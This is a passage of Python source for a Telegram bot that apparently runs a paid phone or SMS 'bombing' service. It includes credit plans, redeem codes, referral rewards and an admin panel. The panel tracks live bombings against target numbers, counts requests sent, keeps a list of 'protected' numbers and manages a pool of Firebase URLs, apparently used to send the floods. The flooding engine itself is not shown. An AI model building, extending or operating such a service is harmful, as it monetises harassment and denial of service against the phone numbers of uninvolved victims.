                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    reply_markup=kb)
                return
            
            if data.startswith("rc:"):
                plan = data.split(":")[1]
                plans = {
                    "5": ("5 Credits", "₹25"), "10": ("10 Credits", "₹50"),
                    "25": ("25 Credits", "₹100"), "50": ("50 Credits", "₹200"),
                    "month1": ("1 Month Premium", "₹300"),
                    "month3": ("3 Months Premium", "₹700"),
                }
                if plan not in plans: return
                name, price = plans[plan]
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   💳 {name.upper()}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"💵 Price: {price}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📌 ᴛᴏ ᴘᴜʀᴄʜᴀꜱᴇ:\n\n"
                    f"📱 DM Support:\n   {SUPPORT_USERNAME}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📌 ꜱᴛᴇᴘꜱ:\n"
                    f"1. Message support\n2. Complete payment\n"
                    f"3. Share screenshot\n4. Wait for approval\n"
                    f"5. Added automatically\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📱 CONTACT SUPPORT", url=SUPPORT_LINK,
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:recharge",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # REDEEM
            if data == "user:redeem":
                context.user_data["awaiting_redeem"] = True
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Send your redeem code:\n\n"
                    "Example:\n`WARRIOR-A1B2-C3D4`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # REFER
            if data == "user:refer":
                bot_username = (await context.bot.get_me()).username
                u = get_user(uid)
                link = f"https://t.me/{bot_username}?start=ref_{uid}"
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   🔗 ʀᴇꜰᴇʀ & ᴇᴀʀɴ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Your Link:\n`{link}`\n\n"
                    f"📊 Referrals: `{u.get('referral_count', 0)}`\n"
                    f"💰 Earned: `{u.get('referral_count', 0) * 5}` credits\n\n"
                    f"🎁 1 Referral = 5 Credits\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📤 SHARE",
                                              url=f"https://t.me/share/url?url={link}",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # HISTORY
            if data == "user:history":
                rows = get_activity(uid, 10)
                txt = "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   📜 ʜɪꜱᴛᴏʀʏ\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                if not rows: txt += "_No history_\n"
                for a_, d_, t_ in rows:
                    txt += f"• {a_}\n  _{d_[:40]}_\n  `{t_[:19]}`\n\n"
                txt += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt, parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # STATUS
            if data == "user:system":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🛡️ ꜱʏꜱᴛᴇᴍ ꜱᴛᴀᴛᴜꜱ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "✅ Bot: ONLINE\n"
                    "✅ Database: ACTIVE\n"
                    "✅ Engine: ARMED\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # BACK
            if data == "user:back":
                context.user_data.clear()
                await q.edit_message_text(welcome_text(uid),
                    reply_markup=user_main_kb(uid), parse_mode="Markdown")
                return
        except Exception as e:
            log.error(f"user_callback: {e}")

# ===================== ADMIN KEYBOARDS =====================
def owner_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 DASHBOARD", callback_data="adm:dashboard",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("🛰️ LIVE", callback_data="adm:live",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("👥 USERS", callback_data="adm:users",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("🚫 BAN/UNBAN", callback_data="adm:ban_menu",
                              api_kwargs={"style": "danger"})],
        [InlineKeyboardButton("💎 PREMIUM", callback_data="adm:prem_menu",
                              api_kwargs={"style": "success"}),
         InlineKeyboardButton("💰 CREDITS", callback_data="adm:credits_menu",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("💰 BULK CREDITS", callback_data="adm:bulk_credits",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("🛡️ PROTECTED", callback_data="adm:prot_menu",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("🎁 REDEEM CODES", callback_data="adm:redeem_menu",
                              api_kwargs={"style": "success"}),
         InlineKeyboardButton("🛰️ FIREBASES", callback_data="adm:fb_menu",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("⚙️ LIMITS", callback_data="adm:limits_menu",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("📢 BROADCAST", callback_data="adm:bc_all",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("📢 CHANNELS", callback_data="adm:channels_menu",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("🔧 MAINTENANCE", callback_data="adm:maintenance",
                              api_kwargs={"style": "danger"})],
        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:main",
                              api_kwargs={"style": "primary"})],
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚫 BAN USER", callback_data="adm:ban_add",
                              api_kwargs={"style": "danger"})],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="adm:ban_remove",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("💰 GIVE CREDITS", callback_data="adm:give_credits",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("🎁 GENERATE REDEEM", callback_data="adm:gen_redeem",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="adm:bc_all",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:main",
                              api_kwargs={"style": "primary"})],
    ])

def back_kb(target="adm:main"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 BACK", callback_data=target,
                              api_kwargs={"style": "primary"})]
    ])

# ===================== ADMIN CALLBACK =====================
async def admin_callback(update, context):
    async with _user_semaphore:
        try:
            q = update.callback_query
            await q.answer()
            uid = q.from_user.id
            if not has_admin_access(uid):
                await q.edit_message_text("⛔ Access Denied."); return
            data = q.data
            if not data.startswith("adm:"): return
            a = data[4:]
            
            owner_only = ["dashboard", "live", "users", "fb_menu", "fb_add",
                          "fb_refresh", "limits_menu", "set:", "channels_menu",
                          "add_channel", "remove_channel_menu", "rm_ch:",
                          "confirm_rm:", "maintenance", "prot_menu", "prot_add",
                          "prot_remove", "prot_rm:", "bulk_credits",
                          "bulk_confirm", "stop", "stopall", "prem_list"]
            is_owner_only = any(a.startswith(x) for x in owner_only)
            if is_owner_only and not is_owner(uid):
                await q.answer("⛔ Owner only!", show_alert=True); return
            
            # MAIN
            if a == "main":
                context.user_data.pop("admin_action", None)
                if is_owner(uid):
                    await q.edit_message_text(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "   🔐 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "Full Access\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        reply_markup=owner_kb(), parse_mode="Markdown")
                else:
                    await q.edit_message_text(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "   👮 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "Limited Access\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        reply_markup=admin_kb(), parse_mode="Markdown")
                return
            
            # DASHBOARD
            if a == "dashboard":
                conn = db(); c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM users"); u_cnt = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM users WHERE is_premium = 1"); p_cnt = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM banned_users"); b_cnt = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM redeem_codes WHERE used_count < max_uses")
                rc_cnt = c.fetchone()[0]
                c.execute("SELECT COALESCE(SUM(credits),0) FROM users"); t_cred = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM protected_numbers"); prot_cnt = c.fetchone()[0]
                conn.close()
                active = sum(1 for v in bombing_active.values() if v)
                fbs = get_firebases()
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   📊 ᴅᴀꜱʜʙᴏᴀʀᴅ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👥 Users: `{u_cnt}`\n"
                    f"💎 Premium: `{p_cnt}`\n"
                    f"🚫 Banned: `{b_cnt}`\n"
                    f"🛡️ Protected: `{prot_cnt}`\n"
                    f"🎁 Active Codes: `{rc_cnt}`\n"
                    f"💰 Total Credits: `{t_cred}`\n"
                    f"⚡ Active Bombings: `{active}`\n"
                    f"🛰️ Firebases: `{len(fbs)}`\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:dashboard",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # LIVE
            if a == "live":
                if not active_bombings_detail:
                    await q.edit_message_text("🔴 No active bombings.",
                                              reply_markup=back_kb("adm:main"))
                    return
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   🛰️ ʟɪᴠᴇ ʙᴏᴍʙɪɴɢꜱ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                btns = []
                for i, (bu, info) in enumerate(active_bombings_detail.items(), 1):
                    rt = int(time.time() - info["started"])
                    txt += (f"{i}. 👤 `{bu}` [{info['mode']}]\n"
                            f"   🎯 `{info['target']}`\n"
                            f"   📨 `{info['requests']}` | ⏱️ `{rt}s`\n\n")
                    btns.append([InlineKeyboardButton(f"⛔ STOP {bu}",
                                                      callback_data=f"adm:stop:{bu}",
                                                      api_kwargs={"style": "danger"})])
                btns.append([InlineKeyboardButton("⛔ STOP ALL", callback_data="adm:stopall",
                                                   api_kwargs={"style": "danger"})])
                btns.append([InlineKeyboardButton("🔄 REFRESH", callback_data="adm:live",
                                                   api_kwargs={"style": "primary"})])
                btns.append([InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                                   api_kwargs={"style": "primary"})])
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup(btns), parse_mode="Markdown")
                return
            
            if a.startswith("stop:"):
                try:
                    target_uid = int(a.split(":", 1)[1])
                    if bombing_active.get(target_uid):
                        bombing_active[target_uid] = False
                        await q.edit_message_text(f"⛔ Stopped `{target_uid}`",
                            reply_markup=back_kb("adm:live"), parse_mode="Markdown")
                    else:
                        await q.answer("Not active.", show_alert=True)
                except Exception: pass
                return
            
            if a == "stopall":
                n = 0
                for bu in list(bombing_active.keys()):
                    if bombing_active.get(bu): bombing_active[bu] = False; n += 1
                await q.edit_message_text(f"⛔ Stopped `{n}` bombings.",
                    reply_markup=back_kb("adm:live"), parse_mode="Markdown")
                return
            
            # USERS
            if a == "users":
                conn = db(); c = conn.cursor()
                c.execute("SELECT user_id, username, credits, is_premium FROM users ORDER BY joined_at DESC LIMIT 20")
                rows = c.fetchall(); conn.close()
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   👥 ᴜꜱᴇʀꜱ (last 20)\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                for u_i, un, cr, pr in rows:
                    badge = "💎" if pr else "👤"
                    txt += f"{badge} `{u_i}` @{un or '-'} | 💰 {cr}\n"
                txt += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt, reply_markup=back_kb(),
                    parse_mode="Markdown")
                return
            
            # BAN
            if a == "ban_menu":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🚫 ʙᴀɴ ᴍᴀɴᴀɢᴇʀ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Choose action:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ BAN USER", callback_data="adm:ban_add",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("❌ UNBAN USER", callback_data="adm:ban_remove",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            if a == "ban_add":
                context.user_data["admin_action"] = "ban_add"
                await q.edit_message_text("Send user ID to ban:"); return
            if a == "ban_remove":
                context.user_data["admin_action"] = "ban_remove"
                await q.edit_message_text("Send user ID to unban:"); return
            
            # PREMIUM
            if a == "prem_menu":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   💎 ᴘʀᴇᴍɪᴜᴍ ᴍᴀɴᴀɢᴇʀ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Choose action:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("♾️ UNLIMITED PLAN", callback_data="adm:unlimited_menu",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("❌ REMOVE PREMIUM", callback_data="adm:prem_del",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("📋 PREMIUM USERS", callback_data="adm:prem_list",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "unlimited_menu":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ ᴘʟᴀɴ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Select duration:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("⚡ 1 MONTH (30 DAYS)",
                                              callback_data="adm:unl:30",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔥 3 MONTHS (90 DAYS)",
                                              callback_data="adm:unl:90",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("👑 LIFETIME",
                                              callback_data="adm:unl:0",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:prem_menu",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a.startswith("unl:"):
                days = int(a.split(":")[1])
                context.user_data["admin_action"] = f"give_unlimited:{days}"
                label = "Lifetime" if days == 0 else f"{days} Days"
                await q.edit_message_text(
                    f"♾️ *UNLIMITED — {label}*\n\nSend user ID:",
                    parse_mode="Markdown")
                return
            
            if a == "prem_del":
                context.user_data["admin_action"] = "prem_del"
                await q.edit_message_text("Send user ID to remove premium:"); return
            
            if a == "prem_list":
                conn = db(); c = conn.cursor()
                c.execute("SELECT user_id, premium_type, premium_expires_at FROM users WHERE is_premium = 1 LIMIT 20")
                rows = c.fetchall(); conn.close()
                if not rows:
                    await q.edit_message_text("📭 No premium users.",
                                              reply_markup=back_kb("adm:prem_menu")); return
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   📋 ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                for u_id, ptype, exp in rows:
                    if exp == 0: exp_str = "Lifetime"
                    else:
                        rem = int(exp - time.time())
                        exp_str = f"{rem // 86400}d left" if rem > 0 else "Expired"
                    txt += f"👤 `{u_id}` — {ptype or 'premium'} — {exp_str}\n"
                txt += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt, reply_markup=back_kb("adm:prem_menu"),
                    parse_mode="Markdown")
                return
            
            # CREDITS
            if a == "credits_menu":
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   💰 ᴄʀᴇᴅɪᴛꜱ ᴍᴀɴᴀɢᴇʀ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Choose action:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ GIVE CREDITS", callback_data="adm:give_credits",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("➖ REMOVE CREDITS", callback_data="adm:remove_credits",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            if a == "give_credits":
                context.user_data["admin_action"] = "give_credits"
                await q.edit_message_text("Send: `<user_id> <credits>`", parse_mode="Markdown"); return
            if a == "remove_credits":
                context.user_data["admin_action"] = "remove_credits"
                await q.edit_message_text("Send: `<user_id> <credits>`", parse_mode="Markdown"); return
            
            # BULK CREDITS
            if a == "bulk_credits":
                conn = db(); c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM users"); total = c.fetchone()[0]
                c.execute("SELECT COALESCE(SUM(credits),0) FROM users"); tc = c.fetchone()[0]
                conn.close()
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   💰 ʙᴜʟᴋ ᴄʀᴇᴅɪᴛꜱ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Give credits to ALL users.\n\n"
                    f"📊 Current:\n"
                    f"   👥 Users: `{total}`\n"
                    f"   💰 Total Credits: `{tc}`\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Send credits per user:\n\n"
                    f"Example: `5`\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 CANCEL", callback_data="adm:main",
                                              api_kwargs={"style": "danger"})],
                    ]))
                context.user_data["admin_action"] = "bulk_credits_input"
                return
            
            if a == "bulk_confirm":
                amount = context.user_data.get("bulk_amount", 0)
                if amount <= 0:
                    await q.answer("Session expired.", show_alert=True); return
                
                progress_msg = await q.edit_message_text(
                    f"⏳ Giving `{amount}` credits to all users...",
                    parse_mode="Markdown")
                
                conn = db(); c = conn.cursor()
                c.execute("SELECT user_id FROM users")
                users = [row[0] for row in c.fetchall()]
                conn.close()
                
                total = len(users)
                notified = 0; failed = 0
                
                conn = db(); c = conn.cursor()
                c.execute("UPDATE users SET credits = credits + ?", (amount,))
                conn.commit(); conn.close()
                
                for i, target_id in enumerate(users, 1):
                    if has_admin_access(target_id): continue
                    u = get_user(target_id)
                    new_bal = u.get("credits", 0) if u else amount
                    try:
                        await context.bot.send_message(target_id,
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"   🎁 ᴄʀᴇᴅɪᴛꜱ ʀᴇᴄᴇɪᴠᴇᴅ!\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"✅ +{amount} Credits Added\n\n"
                            f"💰 New Balance: `{new_bal}`\n\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                            parse_mode="Markdown")
                        notified += 1
                    except Exception:
                        failed += 1
                    if i % 50 == 0:
                        try:
                            await context.bot.edit_message_text(
                                chat_id=q.message.chat_id,
                                message_id=progress_msg.message_id,
                                text=f"⏳ Progress: `{i}` / `{total}`\n✅ Notified: `{notified}`",
                                parse_mode="Markdown")
                        except Exception: pass
                    await asyncio.sleep(0.05)
                
                log_activity(uid, "Bulk Credits", f"+{amount} to {total}")
                
                await context.bot.edit_message_text(
                    chat_id=q.message.chat_id,
                    message_id=progress_msg.message_id,
                    text=(
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"   ✅ ᴄᴏᴍᴘʟᴇᴛᴇ\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"✅ Notified: `{notified}`\n"
                        f"❌ Failed: `{failed}`\n"
                        f"📊 Total: `{total}`\n\n"
                        f"💰 Each got: `{amount}`\n"
                        f"📊 Total: `{amount * total}`\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                    ),
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 ADMIN PANEL", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]))
                context.user_data.pop("bulk_amount", None)
                return
            
            # PROTECTED
            if a == "prot_menu":
                conn = db(); c = conn.cursor()
                c.execute("SELECT number FROM protected_numbers ORDER BY added_at DESC LIMIT 20")
                rows = c.fetchall()
                c.execute("SELECT COUNT(*) FROM protected_numbers")
                total = c.fetchone()[0]
                conn.close()
                if not rows:
                    txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                           "   🛡️ ᴘʀᴏᴛᴇᴄᴛᴇᴅ ɴᴜᴍʙᴇʀꜱ\n"
                           "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                           "📭 _No protected numbers_\n\n"
                           "━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                else:
                    txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                           "   🛡️ ᴘʀᴏᴛᴇᴄᴛᴇᴅ ɴᴜᴍʙᴇʀꜱ\n"
                           "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                           f"Total: `{total}`\n\n")
                    for i, (num,) in enumerate(rows, 1):
                        txt += f"{i}. `{num}`\n"
                    txt += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ ADD", callback_data="adm:prot_add",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("❌ REMOVE", callback_data="adm:prot_remove",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:prot_menu",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "prot_add":
                context.user_data["admin_action"] = "prot_add"
                await q.edit_message_text("➕ Send 10-digit number to protect:")
                return
            
            if a == "prot_remove":
                conn = db(); c = conn.cursor()
                c.execute("SELECT number FROM protected_numbers ORDER BY added_at DESC LIMIT 15")
                rows = c.fetchall(); conn.close()
                if not rows:
                    await q.edit_message_text("📭 No protected numbers.",
                                              reply_markup=back_kb("adm:prot_menu")); return
                btns = []
                for (num,) in rows:
                    btns.append([InlineKeyboardButton(f"🗑️ {num}",
                                                      callback_data=f"adm:prot_rm:{num}",
                                                      api_kwargs={"style": "danger"})])
                btns.append([InlineKeyboardButton("🔙 BACK",
                                                   callback_data="adm:prot_menu",
                                                   api_kwargs={"style": "primary"})])
                await q.edit_message_text("Select number to remove:",
                    reply_markup=InlineKeyboardMarkup(btns))
                return
            
            if a.startswith("prot_rm:"):
                num = a.split(":", 1)[1]
                conn = db(); c = conn.cursor()
                c.execute("DELETE FROM protected_numbers WHERE number = ?", (num,))
                conn.commit(); conn.close()
                await q.edit_message_text(
                    f"✅ Removed `{num}`.",
                    parse_mode="Markdown",
                    reply_markup=back_kb("adm:prot_menu"))
                return
            
            # REDEEM
            if a == "redeem_menu":
                conn = db(); c = conn.cursor()
                c.execute("SELECT COUNT(*) FROM redeem_codes WHERE used_count < max_uses")
                active = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM redeem_codes")
                total = c.fetchone()[0]
                conn.close()
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇꜱ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Active: `{active}`\n"
                    f"📊 Total: `{total}`\n\n"
                    f"Choose action:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🎁 GENERATE CODE", callback_data="adm:gen_redeem",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("📋 ACTIVE CODES", callback_data="adm:active_codes",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "gen_redeem":
                context.user_data["admin_action"] = "generate_redeem"
                await q.edit_message_text(
                    "🎁 Send: `<credits> <max_uses>`\n\nExample: `10 5`",
                    parse_mode="Markdown")
                return
            
            if a == "active_codes":
                conn = db(); c = conn.cursor()
                c.execute("SELECT code, credits, max_uses, used_count FROM redeem_codes WHERE used_count < max_uses ORDER BY created_at DESC LIMIT 15")
                rows = c.fetchall(); conn.close()
                if not rows:
                    await q.edit_message_text("📭 No active codes.",
                                              reply_markup=back_kb("adm:redeem_menu")); return
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   🎁 ᴀᴄᴛɪᴠᴇ ᴄᴏᴅᴇꜱ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                for code, cred, mx, usd in rows:
                    txt += f"🎁 `{code}`\n   💰 {cred} | 👥 {usd}/{mx}\n\n"
                txt += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="adm:active_codes",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:redeem_menu",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            # FIREBASES
            if a == "fb_menu":
                fbs = get_firebases()
                txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   🛰️ ꜰɪʀᴇʙᴀꜱᴇꜱ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                       f"Total: `{len(fbs)}`\n\n")
                for fb in fbs[:15]:
                    cache = firebase_cache.get(fb["tag"], {})
                    txt += (f"📊 `{fb['tag']}`\n"
                            f"🟢 {cache.get('online',0)} | 🔴 {cache.get('offline',0)} | 📊 {cache.get('total',0)}\n")
                if len(fbs) > 15: txt += f"\n_+{len(fbs)-15} more_"
                txt += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ ADD FIREBASE", callback_data="adm:fb_add",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔄 REFRESH ALL", callback_data="adm:fb_refresh",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "fb_add":
                context.user_data["admin_action"] = "add_firebase"
                await q.edit_message_text(
                    "➕ Send ONE or MULTIPLE Firebase URLs:\n\n"
                    "Single:\n`https://xxx.firebaseio.com`\n\n"
                    "Multiple (one per line)\n\n"
                    "📌 Bulk: Only ≥10 online added\n"
                    "📌 Single: alive only (0+)",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 CANCEL", callback_data="adm:fb_menu",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if a == "fb_refresh":
                await q.edit_message_text("⏳ Refreshing all...")
                for fb in get_firebases():
                    s = fetch_firebase_stats(fb["url"])
                    if s: firebase_cache[fb["tag"]] = s
                await q.edit_message_text("✅ Refreshed!",
                    reply_markup=back_kb("adm:fb_menu"))
                return
            
            # LIMITS
            if a == "limits_menu":
